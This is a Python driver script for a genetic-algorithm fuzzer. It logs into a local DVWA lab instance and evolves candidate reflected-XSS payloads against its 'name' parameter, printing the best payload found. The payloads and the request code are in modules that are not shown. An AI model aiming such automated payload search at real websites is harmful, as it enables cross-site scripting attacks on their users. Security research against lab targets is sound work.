from src.send_request import login_dvwa, send_payload
from src.ga_engine import setup_ga
from src.fitness import evaluate
import random


if __name__ == "__main__":
    # === LOGIN FIRST ===
    login_dvwa()
    print("[+] Logged into DVWA")

    # === TARGET URL & PARAM KEY ===
    url = "http://localhost/dvwa/vulnerabilities/xss_r/"
    param = "name"

    # === GA Setup ===
    toolbox = setup_ga()
    population = toolbox.population(n=10)  # population size

    # === Initial fitness evaluation ===
    fitnesses = [evaluate(ind, url, param) for ind in population]
    for ind, fit in zip(population, fitnesses):
        ind.fitness.values = fit

    # === GA Evo loop ===
    NGEN = 5  # number of generations
    print("[+] Starting Genetic Algorithm...\n")

    for gen in range(NGEN):
        # Selection + clone
        offspring = toolbox.select(population, len(population))
        offspring = list(map(toolbox.clone, offspring))

        # Crossover
        for c1, c2 in zip(offspring[::2], offspring[1::2]):
            if random.random() < 0.5:
                toolbox.mate(c1, c2)
                del c1.fitness.values
                del c2.fitness.values

        # Mutation
        for mutant in offspring:
            if random.random() < 0.2:
                toolbox.mutate(mutant)
                del mutant.fitness.values

        # Re-evaluate fitness for new individuals
        invalid_ind = [ind for ind in offspring if not ind.fitness.valid]
        fitnesses = [evaluate(ind, url, param) for ind in invalid_ind]

        for ind, fit in zip(invalid_ind, fitnesses):
            ind.fitness.values = fit

        population[:] = offspring

        # Print best of generation
        best_fitness = max(ind.fitness.values[0] for ind in population)
        print(f"Generation {gen} best fitness = {best_fitness}")

    # === FINAL BEST PAYLOAD ===
    best = max(population, key=lambda ind: ind.fitness.values[0])
    print("\n=== FINAL RESULT ===")
    print("Best payload found:", "".join(best))
